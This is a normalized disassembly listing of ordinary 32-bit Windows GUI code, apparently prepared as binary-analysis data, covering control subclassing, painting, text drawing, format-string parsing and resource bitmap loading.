call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] eax
test eax 0x10000000
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x44
retn
cmp [ esp + 0x60 ] 0x3
jne r-xdata
cmp [ esp + 0x5c ] 0x0
je r-xdata
and al 0x3
cmp al 0x3
jne r-xdata
lea eax [ esp + 0x24 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push esi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0x24 ]
push eax
push edi
call ebx
lea ecx [ esp + 0x2c ]
mov bp 0xf
push ecx
push edi
call ebx
push edi
call [ GetDC@IAT ]
mov ebx eax
mov eax [ esp + 0x10 ]
and eax 0x100000
mov [ esp + 0x1c ] eax
je r-xdata
push esi
call [ HideCaret@IAT ]
push 0x0
push 0x0
push 0x157
push esi
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
and eax 0x200000
mov [ esp + 0x20 ] eax
je r-xdata
mov bp 0x7
push 0xfffffff4
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x5c ]
sub ecx eax
cmp ecx 0xfffffc18
jne r-xdata
and bp 0xfffb
lea eax [ esp + 0x24 ]
push ebp
push eax
push ebx
call sub_416d70
add esp 0xc
cmp [ esp + 0x60 ] 0x3
jne r-xdata
mov [ esp + 0x18 ] 0x29a
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x1944
push edi
call [ SendMessageA@IAT ]
cmp [ esp + 0x18 ] 0x29a
mov [ esp + 0x34 ] eax
jne r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
and al 0x3
cmp al 0x3
jne r-xdata
lea eax [ esp + 0x44 ]
push 0x10
push eax
push edi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x44 ]
push r--data
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x1943
push edi
call [ SendMessageA@IAT ]
mov [ esp + 0x34 ] eax
cmp [ esp + 0x1c ] 0x0
je r-xdata
lea eax [ esp + 0x24 ]
push 0x4
inc [ esp + 0x30 ]
push 0x0
push 0x0
push eax
push ebx
call sub_416c30
mov eax [ esp + 0x38 ]
dec [ esp + 0x40 ]
mov ebp [ esp + 0x40 ]
mov [ esp + 0x58 ] eax
add esp 0x14
push 0x2
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0x8
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x2c ] ebp
push 0x7
push eax
push ebx
call sub_416c30
mov eax [ esp + 0x58 ]
mov [ esp + 0x38 ] eax
add esp 0x14
mov ebp [ esp + 0x2c ]
push 0x2
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0xc
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x2c ] ebp
push 0x7
push eax
push ebx
call sub_416c30
add esp 0x14
push esi
call sub_4186b0
add esp 0x4
jmp r-xdata
push edi
call [ GetParent@IAT ]
mov [ esp + 0x14 ] eax
push 0x2
lea eax [ esp + 0x28 ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
push edi
call [ MapWindowPoints@IAT ]
push ebx
push edi
call [ ReleaseDC@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
call [ GetDC@IAT ]
cmp [ esp + 0x5c ] 0x0
mov ebx eax
je r-xdata
cmp [ esp + 0x18 ] 0x1
jne r-xdata
push ebx
push edi
call [ ReleaseDC@IAT ]
cmp [ esp + 0x5c ] 0x0
je r-xdata
lea eax [ esp + 0x24 ]
push 0x8
inc [ esp + 0x34 ]
push 0x0
push 0x0
push eax
push ebx
call sub_416c30
dec [ esp + 0x44 ]
add esp 0x14
mov ebp [ esp + 0x30 ]
push 0x15
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0x4
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x30 ] ebp
push 0x7
push eax
push ebx
call sub_416c30
add esp 0x14
and bp 0xfffd
inc [ esp + 0x28 ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
and eax 0x3
cmp eax 0x2
je r-xdata
cmp [ esp + 0x34 ] 0x3eb
jne r-xdata
push esi
call [ ShowCaret@IAT ]
push 0x0
push 0x0
push 0x157
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
cmp eax 0x3
je r-xdata
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push ebx
push eax
call [ ReleaseDC@IAT ]
push esi
call [ ShowCaret@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x44
retn
and bp 0xfff7
push 0x5
push edi
call [ GetWindow@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
push eax
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x34 ]
push 0x1008
sub eax [ esp + 0x40 ]
lea ecx [ esp + 0x28 ]
add [ esp + 0x30 ] eax
push ecx
push ebx
call sub_416d70
mov eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
add [ esp + 0x38 ] eax
add esp 0xc
jmp r-xdata
sub_4195d0
sub esp 0x4
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x1c ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x18 ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
mov ebp [ esp + 0x24 ]
test eax eax
mov eax [ esp + 0x20 ]
push ebp
mov ebx [ esp + 0x2c ]
push eax
push edi
push esi
push ebx
push esi
je r-xdata
mov ebx [ esp + 0x28 ]
mov ebp [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
push ebx
mov esi [ esp + 0x1c ]
push ebp
push eax
push edi
push esi
call sub_416b50
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov [ esp + 0x10 ] eax
cmp ebx 0x3
jne r-xdata
call sub_416920
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
mov eax [ esp + 0x10 ]
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov ecx eax
and cl 0x3
cmp cl 0x2
jne r-xdata
cmp edi 0x46
je r-xdata
je r-xdata
cmp edi 0x18
ja r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
cmp [ rw-data ] 0x30a
jb r-xdata
cmp edi 0x1943
jb r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp edi 0xf
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
push ebp
push esi
call sub_4185f0
add esp 0x8
jmp r-xdata
cmp edi 0x1944
jbe r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
cmp ebx 0x3
jne r-xdata
mov eax 0x3ea
mov [ ebp ] 0x1
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
jmp r-xdata
push 0x0
push esi
call sub_4185f0
add esp 0x8
jmp r-xdata
push ebx
push 0x1
push esi
call sub_419290
add esp 0xc
jmp r-xdata
and eax 0x3
cmp eax 0x2
je r-xdata
cmp eax 0x3
jne r-xdata
sub_419750
sub esp 0x20
push ebx
push esi
mov esi [ esp + 0x30 ]
push edi
cmp esi 0x82
jne r-xdata
xor eax eax
mov edi [ esp + 0x30 ]
mov ax [ rw-data ]
push eax
push edi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
push eax
mov edi [ esp + 0x34 ]
push ecx
push edx
push esi
push edi
call sub_416b50
add esp 0x14
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x18
ja r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push eax
push ecx
push esi
push edi
push edx
push edi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x83
ja r-xdata
je r-xdata
cmp esi 0x1943
jb r-xdata
je r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp esi 0xf
je r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push eax
push ecx
push esi
push edi
push edx
push edi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x20
retn
cmp esi 0x1944
jbe r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp esi 0x46
je r-xdata
cmp [ esp + 0x38 ] 0x0
jne r-xdata
mov ebx [ esp + 0x40 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x38 ]
push eax
push ecx
push esi
push edi
push ebx
push edi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov esi eax
push ebx
push 0x0
push edi
call sub_419290
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x3c ]
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3e9
add esp 0x20
retn
jmp r-xdata
lea eax [ esp + 0x1c ]
push eax
push edi
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
mov edx [ esp + 0x40 ]
push ecx
push eax
push esi
push edi
push edx
push edi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov esi eax
mov edx [ esp + 0x3c ]
lea ecx [ esp + 0xc ]
mov eax [ edx ]
mov ebx [ edx + 0x4 ]
push 0x1
push 0x2
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
mov [ ecx + 0x4 ] ebx
mov edx [ edx + 0xc ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
lea ecx [ esp + 0x14 ]
push ecx
call [ InflateRect@IAT ]
mov ecx [ esp + 0x28 ]
cmp [ esp + 0x18 ] ecx
jge r-xdata
cmp [ rw-data ] 0x30a
jb r-xdata
jmp r-xdata
push 0x0
push edi
call sub_4185f0
add esp 0x8
jmp r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x18 ]
push edi
inc eax
mov [ esp + 0x14 ] eax
lea eax [ ecx + 0x1 ]
mov [ esp + 0x1c ] eax
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
lea eax [ esp + 0xc ]
push 0x1
push eax
push edi
call [ InvalidateRect@IAT ]
mov eax [ esp + 0x3c ]
push eax
push edi
call sub_4185f0
add esp 0x8
jmp r-xdata
sub_4199b0
mov ecx [ esp + 0x8 ]
cmp ecx 0x1943
jb r-xdata
mov eax [ esp + 0x10 ]
push 0x3
mov edx [ esp + 0x10 ]
push eax
push edx
push ecx
mov ecx [ esp + 0x14 ]
push ecx
call sub_4195d0
add esp 0x14
retn 0x10
cmp ecx 0x1944
jbe r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x1
mov eax 0x3eb
retn 0x10
sub_419a00
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
push 0xf00021
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
mov eax [ esi + 0xc ]
sub eax edx
push eax
mov eax [ esi + 0x8 ]
sub eax ecx
push eax
push edx
push ecx
mov ecx [ ebp + 0xc ]
push ecx
call [ PatBlt@IAT ]
mov edi [ ebp + 0x8 ]
push edi
call [ GetWindowTextLengthA@IAT ]
mov ebx eax
lea eax [ eax + 0x5 ]
add eax 0x3
and eax 0xfffffffc
call sub_40c4f0
mov [ ebp - 0x4 ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add ebx 0x2
mov eax [ ebp - 0x4 ]
push ebx
push eax
push edi
call [ GetWindowTextA@IAT ]
test eax eax
je r-xdata
mov bx 0x140
mov edi [ ebp + 0x14 ]
mov eax edi
and al 0xf
cmp al 0xc
je r-xdata
test edi 0x80
je r-xdata
mov ebx edi
and bx 0xf
or bx 0x150
and edi 0x8000000
je r-xdata
or bh 0x8
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
movzx eax bx
push eax
push esi
push 0xffffffff
push ecx
push edx
call [ DrawTextA@IAT ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
call [ SetTextColor@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
call [ SetTextColor@IAT ]
sub_419ae0
sub esp 0x14
push ebx
push esi
mov esi [ esp + 0x20 ]
push edi
push ebp
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] eax
test eax 0x10000000
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push eax
push esi
call [ GetClientRect@IAT ]
mov eax [ esp + 0x10 ]
and eax 0x1f
cmp eax 0x12
ja r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_419c6c ]
jmp [ ecx * 4 + jump_table_419c44 ]
push 0x0
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x31
push esi
call ebp
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x0
push 0x2
push eax
push edi
call sub_416c30
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x0
inc [ esp + 0x1c ]
push 0x0
inc [ esp + 0x24 ]
push eax
push edi
call sub_416c30
lea ecx [ esp + 0x28 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x14 ]
push 0xf
push 0x2
push 0x2
push ecx
push edi
call sub_416c30
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
lea eax [ esp + 0x14 ]
push 0xf
mov edi [ esp + 0x30 ]
push 0x2
push 0x0
push eax
push edi
call sub_416c30
add esp 0x14
mov edi [ esp + 0x2c ]
mov edi [ esp + 0x2c ]
push ebx
push edi
call [ SelectObject@IAT ]
mov ebx eax
jmp r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push edi
push esi
call sub_419a00
add esp 0x10
test ebx ebx
je r-xdata
push ebp
push edi
call [ SelectObject@IAT ]
mov ebp eax
push 0x2
push edi
call [ SetBkMode@IAT ]
push esi
push edi
push 0x138
push esi
call [ GetParent@IAT ]
push eax
call ebp
mov ebp eax
test ebp ebp
je r-xdata
test ebp ebp
je r-xdata
push ebx
push edi
call [ SelectObject@IAT ]
push ebp
push edi
call [ SelectObject@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x14
retn
sub_419c80
sub esp 0x40
push ebx
push esi
push edi
mov edi [ esp + 0x54 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x50 ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x5c ]
push 0x4
mov ebx [ esp + 0x5c ]
push eax
mov esi [ esp + 0x58 ]
push ebx
push edi
push esi
call sub_416b50
add esp 0x14
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0xf
ja r-xdata
mov eax [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push eax
push ebx
push edi
push esi
push 0x4
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0x1943
jb r-xdata
je r-xdata
mov eax [ esp + 0x5c ]
mov ebx [ esp + 0x58 ]
push eax
push ebx
push edi
push esi
push 0x4
push esi
call sub_416920
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
cmp edi 0x1944
jbe r-xdata
mov ebx [ esp + 0x58 ]
mov edi ebx
test edi edi
jne r-xdata
cmp edi 0xa
je r-xdata
mov eax [ esp + 0x5c ]
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3ec
add esp 0x40
retn 0x10
push edi
push esi
call sub_419ae0
add esp 0x8
test ebx ebx
jne r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
call [ BeginPaint@IAT ]
push eax
mov edi eax
push esi
call sub_416de0
add esp 0x8
push esi
call [ GetDC@IAT ]
push eax
mov edi eax
push esi
call sub_416de0
add esp 0x8
push edi
push esi
call sub_419ae0
add esp 0x8
push edi
push esi
call [ ReleaseDC@IAT ]
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x40
retn 0x10
lea eax [ esp + 0xc ]
push eax
push esi
call [ EndPaint@IAT ]
sub_419dd0
sub esp 0x4
cmp [ esp + 0xc ] 0x1
push esi
jne r-xdata
mov eax 0x1
pop esi
add esp 0x4
retn
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
mov esi [ esp + 0xc ]
mov [ esp + 0x4 ] eax
test eax eax
je r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
movzx cx al
shl cx 0x8
movzx dx ah
or cx dx
test eax 0x80000000
mov [ rw-data ] cx
je r-xdata
push esi
call [ esp + 0x8 ]
mov [ rw-data ] 0x20
mov [ rw-data ] 0x10
cmp cx 0x35f
jb r-xdata
push 0x7
mov esi [ GetSystemMetrics@IAT ]
call esi
dec eax
push 0x8
mov [ rw-data ] eax
call esi
dec eax
push 0x4
mov [ rw-data ] eax
call esi
push 0x1e
mov [ rw-data ] eax
call esi
push rw-data
mov [ rw-data ] eax
call [ LeaveCriticalSection@IAT ]
sub_419ea0
mov eax [ esp + 0x8 ]
sub esp 0x4
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
push ebp
push 0x2
push eax
push esi
call [ FindResourceA@IAT ]
mov edi eax
test edi edi
jne r-xdata
push edi
push esi
call [ SizeofResource@IAT ]
mov ebx eax
push edi
push esi
call [ LoadResource@IAT ]
mov esi eax
test esi esi
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
push ebx
push 0x40
call [ GlobalAlloc@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
mov edi ebp
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x20 ]
xor ecx ecx
mov cl ah
mov edx eax
mov [ esp + 0x10 ] 0x0
shl ecx 0x8
shr edx 0x10
mov [ esp + 0x10 ] dl
xor edx edx
or ecx [ esp + 0x10 ]
mov dl al
shl edx 0x10
mov eax [ esp + 0x28 ]
or ecx edx
mov edx eax
shr edx 0x10
mov [ ebp + 0x28 ] ecx
mov [ esp + 0x10 ] 0x0
xor ecx ecx
mov [ esp + 0x10 ] dl
mov cl ah
xor edx edx
shl ecx 0x8
mov dl al
shl edx 0x10
or ecx [ esp + 0x10 ]
or ecx edx
mov eax [ esp + 0x24 ]
mov edx eax
mov [ ebp + 0x44 ] ecx
shr edx 0x10
xor ecx ecx
mov [ esp + 0x10 ] 0x0
mov cl ah
mov [ esp + 0x10 ] dl
shl ecx 0x8
xor edx edx
or ecx [ esp + 0x10 ]
mov dl al
shl edx 0x10
mov eax [ esp + 0x2c ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x48 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
mov eax [ esp + 0x30 ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x64 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
mov eax [ esp + 0x34 ]
or ecx edx
xor edx edx
mov dl al
mov [ ebp + 0x54 ] ecx
shl edx 0x10
xor ecx ecx
mov cl ah
shl ecx 0x8
push 0x0
shr eax 0x10
or ecx edx
xor edx edx
mov dl al
or ecx edx
mov [ ebp + 0x50 ] ecx
call [ GetDC@IAT ]
mov edi eax
push 0x0
push ebp
lea ecx [ ebp + 0x68 ]
push ecx
push 0x4
push ebp
push edi
call [ CreateDIBitmap@IAT ]
mov esi eax
push edi
push 0x0
call [ ReleaseDC@IAT ]
push ebp
call [ GlobalFree@IAT ]
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn 0x20
sub_41a0a2
sub esp 0x10
and [ esp ] 0x0
push ebp
mov ebp [ esp + 0x1c ]
push esi
mov esi [ esp + 0x1c ]
push edi
mov edi ecx
mov [ esp + 0x18 ] ebp
cmp [ esi ] 0x0
mov [ esp + 0x14 ] edi
je r-xdata
push [ esp + 0xc ]
mov ecx edi
call sub_41c5cf
push [ esp + 0x18 ]
push [ esp + 0x24 ]
push [ edi ]
call sub_40d7c5
add esp 0xc
mov ecx edi
push 0xffffffff
call sub_41c61e
pop edi
pop esi
pop ebp
add esp 0x10
retn 0x8
push ebx
push esi
call sub_40d816
add [ esp + 0x14 ] eax
pop ecx
push esi
call sub_40d477
mov esi eax
pop ecx
mov al [ esi ]
cmp al 0x25
je r-xdata
cmp [ esi ] 0x25
jne r-xdata
pop ebx
xor edi edi
test al al
mov [ esp + 0x28 ] edi
je r-xdata
push esi
call sub_40c19c
pop ecx
mov [ esp + 0x28 ] eax
cmp al 0x23
jne r-xdata
xor ebx ebx
cmp [ esi ] 0x2e
jne r-xdata
movsx eax al
push eax
call sub_40d91b
test eax eax
pop ecx
je r-xdata
cmp al 0x2a
jne r-xdata
add [ esp + 0x10 ] 0x2
jmp r-xdata
and [ esp + 0x14 ] 0x0
push 0x3
push r--data
push esi
call sub_40d82c
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_40d477
mov esi eax
pop ecx
cmp [ esi ] 0x2a
jne r-xdata
push esi
call sub_40d477
pop ecx
mov esi eax
jmp r-xdata
cmp al 0x2d
je r-xdata
mov eax [ ebp ]
add ebp 0x4
mov [ esp + 0x28 ] eax
jmp r-xdata
push esi
call sub_40d477
mov esi eax
pop ecx
mov al [ esi ]
test al al
jne r-xdata
movsx eax [ esi ]
sub eax 0x46
je r-xdata
add esi 0x3
mov [ esp + 0x14 ] 0x40000
jmp r-xdata
push esi
call sub_40c19c
pop ecx
mov ebx eax
mov ebx [ ebp ]
add ebp 0x4
push esi
call sub_40d477
pop ecx
mov esi eax
mov al [ esi ]
test al al
je r-xdata
cmp al 0x2b
je r-xdata
cmp [ esp + 0x28 ] edi
jne r-xdata
push esi
call sub_40d477
pop ecx
mov esi eax
sub eax 0x6
je r-xdata
movsx eax [ esi ]
or eax [ esp + 0x14 ]
mov ecx 0x10063
cmp eax ecx
jg r-xdata
movsx eax al
push eax
call sub_40d91b
test eax eax
pop ecx
je r-xdata
cmp al 0x30
je r-xdata
sub eax 0x10073
je r-xdata
je r-xdata
dec eax
dec eax
je r-xdata
push esi
call sub_40d477
pop ecx
mov esi eax
jmp r-xdata
cmp al 0x20
jne r-xdata
mov eax [ ebp ]
add ebp 0x4
test eax eax
jne r-xdata
sub eax 0xffd0
je r-xdata
push 0x2
add ebp 0x4
pop edi
jmp r-xdata
sub eax 0x43
je r-xdata
sub eax 0x1a
je r-xdata
mov al [ esi ]
test al al
je r-xdata
push eax
call [ lstrlenA@IAT ]
push 0x6
pop edi
jmp r-xdata
sub eax 0x10
je r-xdata
test ebx ebx
je r-xdata
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov [ esp + 0x14 ] 0x10000
sub eax 0x4
jne r-xdata
test edi edi
je r-xdata
push 0x1
pop edi
mov eax [ ebp ]
add ebp 0x4
test eax eax
je r-xdata
sub eax 0x10
je r-xdata
cmp edi [ esp + 0x28 ]
jg r-xdata
cmp edi ebx
jl r-xdata
sub eax ecx
je r-xdata
mov [ esp + 0x14 ] 0x20000
jmp r-xdata
movsx eax [ esi ]
cmp eax 0x69
jg r-xdata
push eax
call sub_40d3c3
pop ecx
jmp r-xdata
sub eax 0x10
jne r-xdata
add [ esp + 0x10 ] edi
mov edi [ esp + 0x18 ]
jmp r-xdata
mov edi [ esp + 0x28 ]
jmp r-xdata
mov edi ebx
sub eax ecx
je r-xdata
sub eax 0x6e
je r-xdata
je r-xdata
mov edi eax
cmp edi 0x1
jge r-xdata
push esi
call sub_40d477
mov esi eax
pop ecx
cmp [ esi ] 0x0
jne r-xdata
sub eax 0xffd0
je r-xdata
add ebp 0x4
dec eax
je r-xdata
test [ esp + 0x16 ] 0x4
je r-xdata
sub eax 0x47
je r-xdata
sub eax ecx
je r-xdata
dec eax
je r-xdata
add ebp 0x4
add ebp 0x8
jmp r-xdata
add ebp 0x8
mov edi 0x80
jmp r-xdata
sub eax 0x11
je r-xdata
sub eax 0x5
je r-xdata
mov edi eax
jmp r-xdata
push 0x20
pop edi
mov eax [ esp + 0x28 ]
add eax ebx
sub eax 0xc
je r-xdata
sub eax 0x3
je r-xdata
dec eax
je r-xdata
jmp r-xdata
dec eax
je r-xdata
add ebp 0x8
mov edi 0x80
lea eax [ ebx + 0x138 ]
jmp r-xdata
dec eax
je r-xdata
cmp eax edi
jl r-xdata
jmp r-xdata
sub_41a3bd
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x1
push eax
push [ esi + 0x94 ]
call sub_41f494
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_41a3e6
mov eax [ esp + 0xc ]
push esi
test eax eax
mov esi ecx
je r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ eax ] 0x0
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx esi
call sub_41a3bd
mov eax [ esp + 0x8 ]
and [ eax ] 0x0
push [ esp + 0xc ]
lea eax [ esi + 0x14 ]
push eax
push [ esp + 0x10 ]
call [ lstrcpynA@IAT ]
jmp r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn 0xc
sub_41a429
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_40da39
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_40da39
sub_41a45b
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x1c ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
dec eax
mov esi ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffff894
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
call sub_40e2dd
mov [ esi ] eax
pop ecx
mov eax esi
pop esi
leave
retn 0x1c
sub_41a4a7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov cx [ eax ]
cmp cx 0x76c
jae r-xdata
movzx edx [ eax + 0xc ]
push [ ebp + 0xc ]
push edx
movzx edx [ eax + 0xa ]
push edx
movzx edx [ eax + 0x8 ]
push edx
movzx edx [ eax + 0x6 ]
movzx eax [ eax + 0x2 ]
push edx
push eax
movzx eax cx
push eax
lea ecx [ ebp + 0x8 ]
call sub_41a45b
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
and [ esi ] 0x0
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
sub_41a4f3
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x8 ]
push esi
push eax
mov esi ecx
push [ ebp + 0x8 ]
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
jne r-xdata
mov eax esi
pop esi
leave
retn 0x8
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x8 ]
push eax
call sub_41a4a7
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
sub_41a586
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
mov [ ecx ] eax
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_40ccd0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_41a5ca
mov eax sub_4266f8
call sub_40cc20
push ecx
